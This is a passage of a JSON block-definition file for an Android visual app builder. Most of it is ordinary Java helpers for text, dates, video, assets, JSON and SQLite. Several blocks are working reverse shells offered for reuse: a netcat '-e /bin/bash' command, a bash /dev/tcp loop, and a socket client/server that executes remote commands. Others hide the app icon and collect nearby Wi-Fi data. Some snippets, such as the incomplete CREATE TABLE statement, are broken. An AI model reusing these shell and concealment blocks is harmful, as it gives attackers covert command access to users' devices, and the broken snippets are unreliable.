Microfone","typeName":"","palette":"223","type":" ","spec":"Bloquear o uso do microfone"},{"code":"if (Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())) {\n    SharedPreferences preferences \u003d context.getSharedPreferences(\"MyPrefs\", Context.MODE_PRIVATE);\n    SharedPreferences.Editor editor \u003d preferences.edit();\n    long %1$s \u003d System.currentTimeMillis();\n    editor.putLong(\"install_time\", %1$s);\n    editor.apply();\n}","color":"#FF00ACC1","name":"Instalar Recebedor","typeName":"","palette":"223","type":" ","spec":"Quando o aplicativo é instalado, salva a data de instalação na variável %s.inputOnly "},{"code":"SharedPreferences preferences \u003d context.getSharedPreferences(\"MyPrefs\", Context.MODE_PRIVATE);\nlong %1$s \u003d preferences.getLong(\"install_time\", %1$s);\nint numDays \u003d %2$s; // Número de dias de validade do aplicativo\nlong expirationTime \u003d %1$s + (numDays * 24 * 60 * 60 * 1000); // Calcula a data de expiração em milissegundos\n\nif (System.currentTimeMillis() \u003e\u003d expirationTime) {\n    // Aplicativo expirou\n    %3$s\n    // Você pode exibir uma mensagem para o usuário e bloquear o acesso ao aplicativo\n}","color":"#FF00ACC1","name":"Verificar Expiração","typeName":"","palette":"223","type":"c","spec":"Verifica se o aplicativo expirou variável da data de instalação:%s.inputOnly validadeEmDias:%d | se expirar:"},{"code":"SharedPreferences preferences \u003d context.getSharedPreferences(\"MyPrefs\", Context.MODE_PRIVATE);\nSharedPreferences.Editor editor \u003d preferences.edit();\nlong expirationTime \u003d %s; // Data de validade em milissegundos\neditor.putLong(\"expiration_time\", expirationTime);\neditor.apply();","color":"#FF00ACC1","name":"Definir Data de Validade","typeName":"","palette":"223","type":" ","spec":"Define a data de validade do aplicativo para %s"},{"code":"SharedPreferences preferences \u003d context.getSharedPreferences(\"MyPrefs\", Context.MODE_PRIVATE);\nSharedPreferences.Editor editor \u003d preferences.edit();\nlong currentTimeMillis \u003d System.currentTimeMillis();\nlong expirationTime \u003d currentTimeMillis + (%d * 24 * 60 * 60 * 1000); // Calcula a data de validade em milissegundos\neditor.putLong(\"expiration_time\", expirationTime);\neditor.apply();","color":"#FF00ACC1","name":"Definir Data de Validade (Dias)","typeName":"","palette":"223","type":" ","spec":"Define a data de validade do aplicativo para %d dias"},{"code":"PackageManager packageManager \u003d context.getPackageManager();\nComponentName componentName \u003d new ComponentName(context, MainActivity.class);\npackageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);","color":"#FF00ACC1","name":"Esconder Ícone do Aplicativo","typeName":"","palette":"223","type":" ","spec":"Esconde o ícone do aplicativo da gaveta de aplicativos"},{"code":"String text \u003d %m.textview_edittext.getText().toString();\nint count \u003d text.replaceAll(\"\\\\s\", \"\").length();","color":"#FF00ACC1","name":"Contar Caracteres (Sem Espaço)","typeName":"d","palette":"224","type":"d","spec":"Contar caracteres (Sem Espaço) em %m.textview_edittext"},{"code":"String text \u003d %m.textview_edittext.getText().toString();\nint count \u003d text.length();","color":"#FF00ACC1","name":"Contar Caracteres (Com Espaço)","typeName":"d","palette":"224","type":"d","spec":"Contar caracteres (Com Espaço) em %m.textview_edittext"},{"code":"String text \u003d %m.textview_edittext.getText().toString();\nint count \u003d text.replaceAll(\"[^A-Za-z]\", \"\").length();","color":"#FF00ACC1","name":"Contar Letras","typeName":"d","palette":"224","type":"d","spec":"Contar letras em %m.textview_edittext"},{"code":"String text \u003d %m.textview_edittext.getText().toString();\nint count \u003d text.replaceAll(\"\\\\D\", \"\").length();","color":"#FF00ACC1","name":"Contar Números","typeName":"d","palette":"224","type":"d","spec":"Contar números em %m.textview_edittext"},{"code":"int number \u003d %d;\nString result \u003d String.valueOf(number);","color":"#FF00ACC1","name":"Converter Número para String","typeName":"","palette":"224","type":"d","spec":"Converter número para string em %d"},{"code":"String text \u003d %s;\nint result \u003d 0;\ntry {\n    result \u003d Integer.parseInt(text);\n} catch (NumberFormatException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Converter String para Número","typeName":"","palette":"224","type":"s","spec":"Converter string para número em %s"},{"code":"%1$s.goBack();","color":"#FF00ACC1","name":"Voltar para Página Anterior","typeName":"","palette":"85","type":" ","spec":"Voltar para página anterior em %m.webview"},{"code":"%1$s.goForward();","color":"#FF00ACC1","name":"Avançar para Próxima Página","typeName":"","palette":"85","type":" ","spec":"Avançar para próxima página em %m.webview"},{"code":"int height \u003d (int) %1$s;\nandroid.view.View alturaview \u003d %2$s;\nandroid.widget.LinearLayout.LayoutParams alturaparams \u003d (android.widget.LinearLayout.LayoutParams) alturaview.getLayoutParams();\nalturaparams.height \u003d height;\nalturaview.setLayoutParams(alturaparams);","color":"#FF00ACC1","name":"Mudar Weight da View","typeName":"","palette":"9","type":" ","spec":"Mudar height para %d em %m.view"},{"code":"int width \u003d (int) %1$s;\nandroid.view.View larguraview \u003d %2$s;\nandroid.widget.LinearLayout.LayoutParams larguraparams \u003d (android.widget.LinearLayout.LayoutParams) larguraview.getLayoutParams();\nlarguraparams.width \u003d width;\nlarguraview.setLayoutParams(larguraparams);","color":"#FF00ACC1","name":"Mudar Width da View","typeName":"","palette":"9","type":" ","spec":"Mudar largura para %d em %m.view"},{"code":"String host \u003d %1$s;\nint port \u003d %2$s;\nString command \u003d \"nc \" + host + \" \" + port + \" -e /bin/bash\";\nRuntime.getRuntime().exec(command);","color":"#FF00ACC1","name":"Reverse Shell","typeName":"","palette":"225","type":" ","spec":"Creates a reverse shell to the specified host %s and port %d using nc (netcat) and /bin/bash"},{"code":"try {\n    String host \u003d %1$s;\n    int port \u003d %2$d;\n    String[] cmd \u003d {\"/bin/bash\", \"-c\", \"exec 5\u003c\u003e/dev/tcp/\" + host + \"/\" + port + \";cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done\"};\n    Runtime.getRuntime().exec(cmd);\n} catch (Exception e) {\n    System.out.println(\"Erro: \" + e.getMessage());\n}","color":"#FF00ACC1","name":"Reverse Shell (Java)","typeName":"","palette":"225","type":" ","spec":"Creates a reverse shell to the specified host %s and port %d using Java\u0027s Runtime class"},{"code":"/* Do not edit any code | made by LEGENDARY STREAMER */\r\n}\r\npublic void LegendaryStreamerNoName(String _from,String _to) {\ntry{\n\t\t\t\tint count;\n\t\t\t\tjava.io.InputStream input\u003d this.getAssets().open(_from);\n\t\t\t\tjava.io.OutputStream output \u003d new  java.io.FileOutputStream(_to+_from);\n\t\t\t\tbyte data[] \u003d new byte[1024];\n\t\t\t\twhile ((count \u003d input.read(data))\u003e0) {\n\t\t\t\t\t\t\t\toutput.write(data, 0, count);\n\t\t\t\t}\n\t\t\t\toutput.flush();\n\t\t\t\toutput.close();\n\t\t\t\tinput.close();\n\t\t\t\t  \n\t}catch(Exception e){\n\t\t\t\t\t \t\r \n\t}\n}\n\npublic void LegendaryStreamerwithname(String _from,String _to,String _nm) {\ntry{\n\t\t\t\tint count;\n\t\t\t\tjava.io.InputStream input\u003d this.getAssets().open(_from);\n\t\t\t\tjava.io.OutputStream output \u003d new  java.io.FileOutputStream(_to+_nm);\n\t\t\t\tbyte data[] \u003d new byte[1024];\n\t\t\t\twhile ((count \u003d input.read(data))\u003e0) {\n\t\t\t\t\t\t\t\toutput.write(data, 0, count);\n\t\t\t\t}\n\t\t\t\toutput.flush();\n\t\t\t\toutput.close();\n\t\t\t\tinput.close();\n\t\t\t\t  \n\t}catch(Exception e){\n\t\t\t\t\t \t\r \n\t}\n}\r\n{\r\n}\n\npublic static class CustomAssetsManager {\n    \nprivate Context myContext;\n    \npublic CustomAssetsManager(Context c) {\n\t    myContext \u003d c;\n\t    \n}\n\npublic CustomAssetsManager(Fragment f) {\n\t    myContext \u003d f.getActivity();\n\t    \n}\n\npublic CustomAssetsManager(DialogFragment df) {\n\t    myContext \u003d df.getActivity();\n\t    \n}\n\npublic void saveFile(String path , String pathTo) {\n\t    copyFile(path,pathTo);\n\t    \n}\n\npublic void saveFolder(String path , String pathTo) {\n\t    copyAssets(path,pathTo);\n}\n\nprivate void copyAssets(final String _folder , final String _to) {\n\t    AssetManager assetManager \u003d myContext.getAssets();\n\t    String[] files \u003d null;\n\t    try {\n\t\t        files \u003d assetManager.list(_folder);\n\t\t    } catch (java.io.IOException e) {\n\t\t        Log.e(\"tag\", \"Failed to get asset file list.\", e);\n\t\t    }\n\t    if (files !\u003d null) for (String filename : files) {\n\t\t        java.io.InputStream in \u003d null;\n\t\t        java.io.OutputStream out \u003d null;\n\t\t        try {\n\t\t\t          in \u003d assetManager.open(_folder + \"/\" +filename);\n\t\t\t          if(!new java.io.File(_to).exists()) {\n\t\t\t\t              new java.io.File(_to).mkdir();\n\t\t\t\t              \n\t\t\t\t          java.io.File outFile \u003d new java.io.File(_to, filename);\n\t\t\t\t          if (!(outFile.exists())) {// File does not exist...\n\t\t\t\t\t                out \u003d new java.io.FileOutputStream(outFile);\n\t\t\t\t\t                copyFile(in, out);\n\t\t\t\t\t          }\n\t\t\t\t              \n\t\t\t\t          } else {\n\t\t\t\t              \n\t\t\t\t          java.io.File outFile \u003d new java.io.File(_to, filename);\n\t\t\t\t          if (!(outFile.exists())) {// File does not exist...\n\t\t\t\t\t                out \u003d new java.io.FileOutputStream(outFile);\n\t\t\t\t\t                copyFile(in, out);\n\t\t\t\t\t          }\n\t\t\t\t          }\n\t\t\t        } catch(java.io.IOException e) {\n\t\t\t            Log.e(\"tag\", \"Failed to copy asset file: \" + filename, e);\n\t\t\t        }     \n\t\t        finally {\n\t\t\t            if (in !\u003d null) {\n\t\t\t\t                try {\n\t\t\t\t\t                    in.close();\n\t\t\t\t\t                } catch (java.io.IOException e) {\n\t\t\t\t\t                    // NOOP\n\t\t\t\t\t                }\n\t\t\t\t            }\n\t\t\t            if (out !\u003d null) {\n\t\t\t\t                try {\n\t\t\t\t\t                    out.close();\n\t\t\t\t\t                } catch (java.io.IOException e) {\n\t\t\t\t\t                    // NOOP\n\t\t\t\t\t                }\n\t\t\t\t            }\n\t\t\t        }  \n\t\t    }\n}\nprivate void copyFile(java.io.InputStream in, java.io.OutputStream out) throws java.io.IOException {\n\t    byte[] buffer \u003d new byte[1024];\n\t    int read;\n\t    while((read \u003d in.read(buffer)) !\u003d -1){\n\t\t      out.write(buffer, 0, read);\n\t\t    }\n}\n\nprivate void copyFile(String filename, String outPath) {\n\t    AssetManager assetManager \u003d myContext.getAssets();\n\t\n\t    java.io.InputStream in;\n\t    java.io.OutputStream out;\n\t    try {\n\t\t        in \u003d assetManager.open(filename);\n\t\t        String newFileName \u003d outPath + \"/\" + filename;\n\t\t        out \u003d new java.io.FileOutputStream(newFileName);\n\t\t\n\t\t        byte[] buffer \u003d new byte[1024];\n\t\t        int read;\n\t\t        while ((read \u003d in.read(buffer)) !\u003d -1) {\n\t\t\t            out.write(buffer, 0, read);\n\t\t\t        }\n\t\t        in.close();\n\t\t        out.flush();\n\t\t        out.close();\n\t\t    } catch (Exception e) {\n\t\t    }\n\t\n}\n}\n{","color":"#FF000000","name":"extra_Asts","typeName":"","palette":"226","type":" ","spec":"put in more block"},{"code":"new CustomAssetsManager(%1$s.this).saveFolder(%2$s,%3$s);","color":"#FF000000","name":"saveFolder","typeName":"","palette":"226","type":" ","spec":"%m.activity FOLDER Name %s save path%s"},{"code":"LegendaryStreamerNoName(%1$s,%2$s);","color":"#FF000000","name":"nonameSave","typeName":"","palette":"226","type":" ","spec":"SAVE ASSETS NAME%s to path%s"},{"code":"LegendaryStreamerwithname(%1$s,%2$s,%3$s);","color":"#FF000000","name":"savewithname","typeName":"","palette":"226","type":" ","spec":"SAVE ASSETS NAME%s to path%s save with name%s"},{"code":"String videoPath \u003d \"file:///android_asset/%1$s\";\n%2$s.setVideoURI(Uri.parse(videoPath));\n%2$s.start();","color":"#FF00ACC1","name":"Set VideoView from Asset","typeName":"","palette":"227","type":" ","spec":"Sets a video from asset %s to %m.videoview and starts playing"},{"code":"InputStream inputStream \u003d getAssets().open(\"%1$s\");\nDrawable drawable \u003d Drawable.createFromStream(inputStream, null);\n%2$s.setImageDrawable(drawable);","color":"#FF00ACC1","name":"Set ImageView from Asset","typeName":"","palette":"227","type":" ","spec":"Sets an image from asset %s to %m.imageview"},{"code":"try (InputStreamReader inputStreamReader \u003d new InputStreamReader(getAssets().open(\"%1$s\"));\n     BufferedReader bufferedReader \u003d new BufferedReader(inputStreamReader)) {\n    StringBuilder stringBuilder \u003d new StringBuilder();\n    String line;\n    while ((line \u003d bufferedReader.readLine()) !\u003d null) {\n        stringBuilder.append(line);\n        stringBuilder.append(\u0027\\n\u0027);\n    }\n    %2$s.setText(stringBuilder.toString());\n} catch (IOException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Set TextView from Asset","typeName":"","palette":"227","type":" ","spec":"Sets the text from asset %s to %m.textview"},{"code":"if (%2$s.startsWith(\"http://\") || %2$s.startsWith(\"https://\")) {\n    %2$s.loadUrl(%3$s);\n} else {\n    String url \u003d \"file:///android_asset/\" + %1$s;\n    %2$s.loadUrl(url);\n}","color":"#FF00ACC1","name":"Load URL or HTML in WebView from Asset","typeName":"","palette":"227","type":" ","spec":"Loads the URL or HTML from asset %s in %m.webview"},{"code":"\"file:///android_asset/\" + \"%1$s\"","color":"#FF00ACC1","name":"Asset Path","typeName":"","palette":"227","type":"s","spec":"assetpath+asset name %s.inputOnly  "},{"code":"FileUtil.makeDir(\"/storage/emulated/0/%1$s/\");\r\n{\n\ttry{\n\t\tint count;\n\t\tjava.io.InputStream input\u003dgetAssets().open(\"%2$s\");\n\t\tjava.io.OutputStream output \u003d new  java.io.FileOutputStream(\"/storage/emulated/0/%1$s/\" + \"%2$s\");\n\t\tbyte data[] \u003d new byte[1024];\n\t\twhile ((count \u003d input.read(data))\u003e0) {\n\t\t\toutput.write(data, 0, count);\n\t\t}\n\t\toutput.flush();\n\t\toutput.close();\n\t\tinput.close();\n\t\t\n\t\t}catch(Exception e){\n\t\t\t\t\r\n\t\t}\n}","color":"#FF2196F3","name":"criar dir com arquivo do assets","typeName":"","palette":"227","type":" ","spec":"criar pasta /storage/emulated/0/ %s.inputOnly  e colocar o arquivo do Assets%s.inputOnly "},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"dd/MM/yyyy HH:mm\", Locale.getDefault());","color":"#FF3F51B5","name":"current DateTime","typeName":"","palette":"228","type":" ","spec":"id:%d Formato dd/MM/yyyy HH:mm"},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"HH:mm\", Locale.getDefault());","color":"#FF3F51B5","name":"current DateTime_copy81","typeName":"","palette":"228","type":" ","spec":"id:%d Formato HH:mm"},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"dd/MM/yyyy\", Locale.getDefault());","color":"#FF3F51B5","name":"current DateTime_copy39","typeName":"","palette":"228","type":" ","spec":"id:%d Formato dd/MM/yyyy"},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"dd/MM\", Locale.getDefault());","color":"#FF3F51B5","name":"current DateTime_copy61","typeName":"","palette":"228","type":" ","spec":"id:%d Formato dd/MM"},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"EEEE\", Locale.getDefault());","color":"#FF3F51B5","name":"current DateTime_copy16","typeName":"","palette":"228","type":" ","spec":"id:%d Formato dia da semana"},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"EEE\", Locale.getDefault());","color":"#FF3F51B5","name":"current DateTime_copy65","typeName":"","palette":"228","type":" ","spec":"id:%d Formato dia da semana abreviado"},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"MMMM\", Locale.getDefault());","color":"#FF3F51B5","name":"current DateTime_copy18","typeName":"","palette":"228","type":" ","spec":"id:%d Formato mês"},{"code":"Date dataHora%1$s \u003d new Date();","color":"#FF3F51B5","name":"obter datahora","typeName":"","palette":"228","type":" ","spec":"id:%d  obter data e/ou hora"},{"code":"dateFormat%1$s.format(dataHora%1$s).toString()","color":"#FF3F51B5","name":"data e hora","typeName":"","palette":"228","type":"s","spec":"retornar data e/ou hora do id:%d "},{"code":"dd/MM","color":"#FF3F51B5","name":"data e hora_copy50","typeName":"","palette":"228","type":"s","spec":"formato dd/MM "},{"code":"dd/MM/yyyy","color":"#FF3F51B5","name":"data e hora_copy55","typeName":"","palette":"228","type":"s","spec":"formato dd/MM/yyy "},{"code":"dd/MM/yyyy HH:mm","color":"#FF3F51B5","name":"data e hora_copy43","typeName":"","palette":"228","type":"s","spec":"formato dd/MM/yyy "},{"code":"MMMM","color":"#FF3F51B5","name":"data e hora_copy60","typeName":"","palette":"228","type":"s","spec":"formato MMMM (mês)"},{"code":"MMM","color":"#FF3F51B5","name":"data e hora_copy13","typeName":"","palette":"228","type":"s","spec":"formato MMM (mês abreviado)"},{"code":"EEEE","color":"#FF3F51B5","name":"data e hora_copy68","typeName":"","palette":"228","type":"s","spec":"formato EEEE (dia da semana)"},{"code":"EEE","color":"#FF3F51B5","name":"data e hora_copy41","typeName":"","palette":"228","type":"s","spec":"formato EEE (dia da semana abreviado)"},{"code":"%1$s.getSettings().setJavaScriptEnabled(true);","color":"#FF00ACC1","name":"Enable JavaScript","typeName":"","palette":"229","type":" ","spec":"Ativar JavaScript na WebView %m.webview"},{"code":"String videoPath \u003d \"%1$s\";\n%2$s.loadUrl(\"file:///storage/emulated/0/\" + videoPath);","color":"#FF2196F3","name":"Load Local Video on webview","typeName":"","palette":"229","type":" ","spec":"Carrega o vídeo %s.inputOnly no WebView%m.webview  usando o caminho /storage/emulated/0/ "},{"code":"String videoPath \u003d \"%1$s\"; // Substitua pelo nome do seu arquivo de vídeo\nWebView webView \u003d findViewById(R.id.%2$s); // Substitua pelo ID correto do seu WebView\n\n// HTML e JavaScript para desabilitar controles do vídeo\nString html \u003d \"\u003chtml\u003e\" +\n        \"\u003cbody style\u003d\u0027margin:0;padding:0;\u0027\u003e\" +\n        \"\u003cvideo id\u003d\u0027myVideo\u0027 width\u003d\u0027100%\u0027 height\u003d\u0027100%\u0027 autoplay\u003e\" +\n        \"\u003csource src\u003d\u0027file:///storage/emulated/0/\" + videoPath + \"\u0027 type\u003d\u0027video/mp4\u0027\u003e\" +\n        \"Seu navegador não suporta a tag de vídeo.\" +\n        \"\u003c/video\u003e\" +\n        \"\u003cscript\u003e\" +\n        \"var video \u003d document.getElementById(\u0027myVideo\u0027);\" +\n        \"video.controls \u003d false;\" +\n        \"video.play();\" +\n        \"video.addEventListener(\u0027ended\u0027, function() {\" +\n        \"   video.currentTime \u003d 0;\" +\n        \"   video.play();\" +\n        \"});\" +\n        \"\u003c/script\u003e\" +\n        \"\u003c/body\u003e\" +\n        \"\u003c/html\u003e\";\n\nwebView.getSettings().setJavaScriptEnabled(true);\nwebView.loadDataWithBaseURL(null, html, \"text/html\", \"UTF-8\", null);","color":"#FF2196F3","name":"Load Local Video on webview_copy85","typeName":"","palette":"229","type":" ","spec":"Carrega o vídeo %s.inputOnly no WebView%m.webview  usando o caminho /storage/emulated/0/ "},{"code":"VideoView videoView \u003d findViewById(R.id.%1$s);","color":"#FF00ACC1","name":"Initialize VideoView","typeName":"","palette":"230","type":" ","spec":"Inicializar o VideoView %m.videoview"},{"code":"String videoPath \u003d \"/storage/emulated/0/%s\";","color":"#FF00ACC1","name":"Set Video Path","typeName":"","palette":"230","type":" ","spec":"Definir o caminho %s.inputOnly do vídeo "},{"code":"%1$s.setVideoPath(videoPath);\n%1$s.start();","color":"#FF00ACC1","name":"Play Video","typeName":"","palette":"230","type":" ","spec":"Iniciar a reprodução do vídeo %m.videoview"},{"code":"%1$s.pause();","color":"#FF00ACC1","name":"Pause Video","typeName":"","palette":"230","type":" ","spec":"Pausar a reprodução do vídeo %m.videoview "},{"code":"%1$s.stopPlayback();","color":"#FF00ACC1","name":"Stop Video","typeName":"","palette":"230","type":" ","spec":"Parar a reprodução do vídeo %m.videoview"},{"code":"int currentPosition \u003d %2$s.getCurrentPosition();\nint forwardTime \u003d %1$s*1000; // Avança x segundos\nint duration \u003d %2$s.getDuration();\nif(currentPosition + forwardTime \u003c duration) {\n    %2$s.seekTo(currentPosition + forwardTime);\n}","color":"#FF00ACC1","name":"Forward Video","typeName":"","palette":"230","type":" ","spec":"Avançar %d segundos no vídeo %m.videoview"},{"code":"int currentPosition \u003d %2$s.getCurrentPosition();\nint rewindTime \u003d %1$s*1000; // Retrocede x segundos\nif(currentPosition - rewindTime \u003e 0) {\n    %2$s.seekTo(currentPosition - rewindTime);\n}","color":"#FF00ACC1","name":"Rewind Video","typeName":"","palette":"230","type":" ","spec":"Retroceder %d segundos no vídeo %m.videoview"},{"code":"String serverIp \u003d \"%1$s\";\nint serverPort \u003d %2$s;\n\ntry (Socket socket \u003d new Socket(serverIp, serverPort);\n     BufferedReader in \u003d new BufferedReader(new InputStreamReader(socket.getInputStream()));\n     PrintWriter out \u003d new PrintWriter(socket.getOutputStream(), true);\n     BufferedReader stdIn \u003d new BufferedReader(new InputStreamReader(System.in))) {\n\n    String command \u003d %3$s;\n    while ((command \u003d in.readLine()) !\u003d null) {\n        if (\"exit\".equalsIgnoreCase(command)) {\n            break;\n        }\n        Process process \u003d Runtime.getRuntime().exec(command);\n        BufferedReader processOutput \u003d new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String outputLine;\n        while ((outputLine \u003d processOutput.readLine()) !\u003d null) {\n            out.println(outputLine);\n        }\n        processOutput.close();\n    }\n} catch (IOException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Reverse Shell Client","typeName":"","palette":"225","type":" ","spec":"Transferir dados por reverse shell IP:%s.inputOnly  porta:%d comando:%s.inputOnly (Cliente)"},{"code":"int serverPort \u003d %1$s;\n\ntry (ServerSocket serverSocket \u003d new ServerSocket(serverPort);\n     Socket clientSocket \u003d serverSocket.accept();\n     BufferedReader in \u003d new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n     PrintWriter out \u003d new PrintWriter(clientSocket.getOutputStream(), true);\n     BufferedReader stdIn \u003d new BufferedReader(new InputStreamReader(System.in))) {\n\n    System.out.println(\"Connection from \" + clientSocket.getRemoteSocketAddress() + \" established.\");\n\n    String command \u003d %2$s;\n    while ((command \u003d stdIn.readLine()) !\u003d null) {\n        if (\"exit\".equalsIgnoreCase(command)) {\n            out.println(command);\n            break;\n        }\n        out.println(command);\n        String response;\n        while ((response \u003d in.readLine()) !\u003d null) {\n            System.out.println(response);\n        }\n    }\n} catch (IOException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Reverse Shell Server","typeName":"","palette":"225","type":" ","spec":"Transferir dados por reverse shell porta:%d comando:%s.inputOnly (Servidor)"},{"code":"JSONArray wifiArray \u003d new JSONArray();\nfor (ScanResult result : wifiManager.getScanResults()) {\n    JSONObject wifiObject \u003d new JSONObject();\n    wifiObject.put(\"SSID\", result.SSID);\n    wifiObject.put(\"BSSID\", result.BSSID);\n    wifiObject.put(\"capabilities\", result.capabilities);\n    wifiObject.put(\"frequency\", result.frequency);\n    wifiObject.put(\"level\", result.level);\n    wifiArray.put(wifiObject);\n}\nString wifiJson \u003d wifiArray.toString();","color":"#FF00ACC1","name":"Scan Wi-Fi Networks","typeName":"","palette":"231","type":" ","spec":"Transformar redes Wi-Fi em JSON"},{"code":"wifiArray.toString()","color":"#FF2196F3","name":"wifiJson","typeName":"","palette":"231","type":"s","spec":"wifiJson"},{"code":"%1$s.setAction(Intent.ACTION_VIEW);\r\n%1$s.setClass(getApplicationContext(), %2$s.class);\r\nstartActivity(%1$s);","color":"#1976D2","name":"Change Activity","typeName":"","palette":"9","type":" ","spec":"Mudar activity e conservar anterior Intent:%m.intent  Activity:%m.activity "},{"code":"%1$s.setClass(getApplicationContext(), %2$s.class);\r\nstartActivity(%1$s);\r\nfinish();","color":"#1976D2","name":"Change Activity_copy96","typeName":"","palette":"9","type":" ","spec":"Mudar activity Intent:%m.intent  Activity:%m.activity "},{"code":"String %1$s \u003d android.os.Build.VERSION.RELEASE;","color":"#FF00ACC1","name":"Determinar Versão Android","typeName":"","palette":"178","type":" ","spec":"Armazena a versão do Android na variável:%s.inputOnly "},{"code":"android.os.Build.VERSION.RELEASE.toString()","color":"#FF00ACC1","name":"Retornar Versão Android","typeName":"","palette":"178","type":"s","spec":"Retorna a versão do Android"},{"code":"try {\n    InputStream is \u003d getAssets().open(%1$s);\n    int size \u003d is.available();\n    byte[] buffer \u003d new byte[size];\n    is.read(buffer);\n    is.close();\n    String json \u003d new String(buffer, \"UTF-8\");\n    %2$s \u003d new JSONObject(json);\n} catch (IOException | JSONException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Load JSON from Assets","typeName":"","palette":"232","type":" ","spec":"Load JSON from file %s.inputOnly  in assets and store in %s.inputOnly "},{"code":"try {\n    JSONArray jsonArray \u003d %3$s.getJSONArray(%2$s);\n    %4$s \u003d jsonArray.getJSONObject(%1$d);\n} catch (JSONException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Get Item from JSON Array","typeName":"","palette":"232","type":" ","spec":"Get item at index %s  from JSON array %s  in JSON object %s  and store in %s "},{"code":"try {\n    %3$s.put(%2$s, %1$s);\n} catch (JSONException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Add Item to JSON Object","typeName":"","palette":"232","type":" ","spec":"Add item %s.inputOnly   with key %s  to JSON object %s "},{"code":"try {\n    JSONArray jsonArray \u003d %3$s.getJSONArray(%2$s);\n    jsonArray.put(new JSONObject(%1$s));\n    %3$s.put(%2$s, jsonArray);\n} catch (JSONException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Add Item to JSON Array","typeName":"","palette":"232","type":" ","spec":"Add new item %s  to JSON array %s  in JSON object %s "},{"code":"","color":"#FFA1887F","name":"","typeName":"","palette":"232","type":"s","spec":"file Storage"},{"code":"try {\n    File file \u003d new File(%1$s);\n    FileWriter fileWriter \u003d new FileWriter(file);\n    BufferedWriter bufferedWriter \u003d new BufferedWriter(fileWriter);\n    bufferedWriter.write(%2$s);\n    bufferedWriter.close();\n    return true;\n} catch (IOException e) {\n    e.printStackTrace();\n    return false;\n}","color":"#FF00ACC1","name":"Create JSON File","typeName":"","palette":"232","type":" ","spec":"Create a JSON file at path %s.inputOnly  with content %s.inputOnly "},{"code":"try {\n    File file \u003d new File(%2$s);\n    FileWriter fileWriter \u003d new FileWriter(file, true);\n    BufferedWriter bufferedWriter \u003d new BufferedWriter(fileWriter);\n    bufferedWriter.append(%1$s + \"\\n\");\n    bufferedWriter.close();\n    return true;\n} catch (IOException e) {\n    e.printStackTrace();\n    return false;\n}","color":"#FF00ACC1","name":"Add to JSON File","typeName":"","palette":"232","type":" ","spec":"Add content %s  to JSON file at path %s.inputOnly "},{"code":"try {\n    File file \u003d new File(%1$s);\n    JSONObject jsonObject \u003d new JSONObject();\n    BufferedReader bufferedReader \u003d new BufferedReader(new FileReader(file));\n    String line;\n    while ((line \u003d bufferedReader.readLine()) !\u003d null) {\n        JSONObject jsonLine \u003d new JSONObject(line);\n        jsonObject.put(jsonLine.getString(%2$s), jsonLine);\n    }\n    bufferedReader.close();\n    return jsonObject.toString();\n} catch (IOException | JSONException e) {\n    e.printStackTrace();\n    return null;\n}","color":"#FF00ACC1","name":"Read JSON Key","typeName":"","palette":"232","type":"s","spec":"Read JSON data from file at path %s.inputOnly  and return value for key %s  as string"},{"code":"SQLiteOpenHelper dbHelper \u003d new SQLiteOpenHelper(getApplicationContext(), %1$s, null, 1) {\n    @Override\n    public void onCreate(SQLiteDatabase db) {\n        db.execSQL(\"CREATE TABLE IF NOT EXISTS %2$s (\");\n    }\n\n    @Override\n    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {\n        db.execSQL(\"DROP TABLE IF EXISTS %2$s\");\n        onCreate(db);\n    }\n};","color":"#FF00ACC1","name":"Create Database Helper","typeName":"","palette":"233","type":" ","spec":"Create a SQLiteOpenHelper object for database %s.inputOnly  with table name %s.inputOnly "},{"code":"SQLiteDatabase db \u003d dbHelper.getWritableDatabase();\nContentValues contentValues \u003d new ContentValues();\ncontentValues.put(%2$s, %3$s);\ndb.insert(%1$s, null, contentValues);","color":"#FF00ACC1","name":"Insert Record","typeName":"","palette":"233","type":" ","spec":"Insert a record into table %s.inputOnly  with column name %s  and value %s"},{"code":"SQLiteDatabase db \u003d dbHelper.getReadableDatabase();\nCursor cursor \u003d db.rawQuery(\"SELECT * FROM %1$s WHERE %2$s \u003d ?\", new String[] {%3$s});\nString result \u003d \"\";\nif (cursor.moveToNext()) {\n    result \u003d cursor.getString(cursor.getColumnIndex(%4$s));\n}\ncursor.close();\nreturn result;","color":"#FF00ACC1","name":"Select Record","typeName":"","palette":"233","type":" ","spec":"Select a record from table %s.inputOnly  where column name %s  equals %s , return value from column %s.inputOnly "},{"code":"result \u003d cursor.getString(cursor.getColumnIndex(%1$s))","color":"#FF2196F3","name":"result select record","typeName":"","palette":"233","type":"s","spec":"Result Select record ColumnIndex:%s.inputOnly "},{"code":"SQLiteDatabase db \u003d dbHelper.getWritableDatabase();\ndb.execSQL(\"DELETE FROM %1$s WHERE %2$s \u003d ?\", new String[] {%3$s});","color":"#FF00ACC1","name":"Delete Record","typeName":"","palette":"233","type":" ","spec":"Delete a record from table %s.inputOnly  where column name %s.inputOnly  equals %s.inputOnly  "},{"code":"SQLiteDatabase db \u003d dbHelper.getWritableDatabase();\ndb.execSQL(\"UPDATE %3$s SET %1$s \u003d ? WHERE %4$s \u003d ?\", new String[] {%2$s, %5$s});","color":"#FF00ACC1","name":"Update 